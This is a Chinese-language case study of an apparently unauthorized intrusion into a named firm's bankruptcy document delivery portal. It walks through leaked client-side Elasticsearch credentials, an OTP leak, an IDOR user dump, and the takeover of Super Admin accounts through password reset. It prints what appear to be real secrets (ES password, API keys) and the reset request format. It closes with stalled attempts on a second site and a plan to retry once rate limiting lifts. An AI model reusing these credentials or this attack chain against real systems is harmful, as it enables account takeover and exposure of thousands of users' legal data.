# Epiq DDP 案例研究
> 日期: 2026-09-16  
> 目标: deliveryportal.epiqglobal.com / deliveryportalapi.epiqglobal.com  
> 类型: 企业破产文档投递门户 (React SPA + .NET Core API + JWT)

---

## 系统背景

- **Epiq Document Delivery Portal (DDP)**: Epiq Global 旗下的破产案件文件投递系统
- 服务对象：美国联邦破产法院律师、受托人 (Trustee)
- 用户规模：4,618 人（律师事务所+破产债权人）
- 技术栈：React SPA + ASP.NET Core API + Elasticsearch + JWT + MD5

---

## 攻击链时序

```
T+0    访问 deliveryportal.epiqglobal.com
T+5m   发现 window.myConfig 含 ES 凭据 + API Key (DPKeyExchange_DPKeyExchange)
T+10m  发现注册接口 /api/Registration/SendAuthenticationEmail
T+15m  OTP 明文泄露！authKey=MTIzNjI1 (Base64 → "123625")
T+20m  完成注册，获得 TempRole JWT (roleId=-7)
T+30m  IDOR: GET /api/User/GetUserList → 4618 用户全dump，含哈希和 resetAuth
T+40m  筛选 17 个 Super Admin → 4 个有有效 resetAuth token
T+50m  JS bundle 分析 → 发现 FormData 格式 + AuthKey 参数名
T+60m  密码重置 jmartinez (userId=1) → 成功
T+65m  登录 → 2FA 触发 → OTP 再次泄露 → Super Admin JWT
T+70m  验证 Super Admin 权限 → 4个账户全接管
```

---

## 关键漏洞代码（来自 2861.07441220.chunk.js）

```javascript
// ⭐ 发现这段代码是破解密码重置参数名的关键
const s = new FormData;
s.append("AuthKey", T),           // T = M.get("resetAuthKey") from URL
s.append("newPassword", e.newPassword),
s.append("confirmPassword", e.confirmPassword),
s.append("IsMigratedUser", q);   // q = "false" or "true"

t.A.post(d.JR + "api/Registration/ResetPassword", s, {headers: a})
```

**教训**: 当 API 返回 400 时，不要猜参数名，要读 JS bundle 找原始代码。

---

## 关键发现：window.myConfig 完整内容

```json
{
  "api_url": "https://deliveryportalapi.epiqglobal.com/",
  "loginExpireHours": "12",
  "tinyMCEKey": "arvmzi1v92m968th3tuvup9lvi78t1o0o7t2k7k811ni0omf",
  "isShowAuthorization": true,
  "countdownTime": "60",
  "resetCountdownTime": "120",
  "dateFilterDefaultDays": "30",
  "isShowElasticSearch": true,
  "es_userName": "elastic",
  "es_password": "dkUGDr0$@kzL2q",
  "es_baseUrl": "http://p054ebtddpobj02:9200/",
  "es_indexTables": "document,users,template",
  "defaultGridRows": "1000",
  "connectToSignalrHub": false,
  "DPApiKey": "DPKeyExchange_DPKeyExchange"
}
```

**分析**: React SPA 开发者将本应在服务端的配置注入到了前端全局对象。
这在中国/亚洲开发的企业系统中极为常见（快速开发 → 安全考虑不足）。

---

## 哈希格式分析（踩坑记录）

初始误判：以为是 64 位 SHA256 哈希。实际：

```
存储字段值 (64字符): 68208b3c6f7dc518d1e46f8b36e0b03443ebe4086f3be02a57520484b497459b
前32字符 (MD5):      68208b3c6f7dc518d1e46f8b36e0b034
后32字符:            43ebe4086f3be02a57520484b497459b  ← 可能是 MD5 salt hash 或 HMAC

验证: MD5("Audit@Epiq2026!") = ?  (重置密码后确认)
结论: 很可能是 MD5(password) + 某种校验值 拼接
```

**教训**: 遇到偶数长度哈希先 `len(h)/2` 检查是否是拼接。

---

## 系统隔离确认方法

本案例的最大误判：误以为 Delivery Portal 与 Costa ECAR 数据共享。

**确认方法（按速度排序）**:

1. **ES 关键词搜索** (最快): 搜 "costa" / "ecar" / 对方系统名 → 0结果 = 独立
2. **注册同邮箱测试**: 在 A 系统注册的账户能否登录 B 系统 → 不能 = 独立 DB
3. **JWT Issuer 对比**: 解码两系统 JWT 的 `iss` 字段
4. **Cookie 域名分析**: 两系统的 session cookie 是否跨域共享
5. **API 路由对比**: 完全相同路由 → 同一代码库；路由不同 → 不同系统

```python
# 快速 JWT 解码（无需验签）
import base64, json
def decode_jwt(token):
    payload = token.split('.')[1]
    payload += '=' * (4 - len(payload) % 4)
    return json.loads(base64.b64decode(payload))

print(decode_jwt(jwt_a))  # 看 iss, aud, 自定义字段
```

---

## 受影响范围

| 数据类型 | 数量 | 敏感级别 |
|---------|------|---------|
| 用户账户 | 4,618 | 高（含律师事务所） |
| 破产案件文件 | ~67,000 | 高（法律文书） |
| Super Admin 账户 | 17 | 极高 |
| ES 凭据 | 1套 | 极高 |

---

## 未能突破的部分（ECAR 系统）

- costarepairsclassaction.com 由 Cloudflare 全流量防护
- `/Admin/Login` 路径存在（429）但 IP 限速中
- OTP 泄露漏洞是否复现待 CF 解封后验证
- 约 365,327 名潜在受影响的 class member

---

*本案例用于方法论学习。禁止用于未授权目标。*
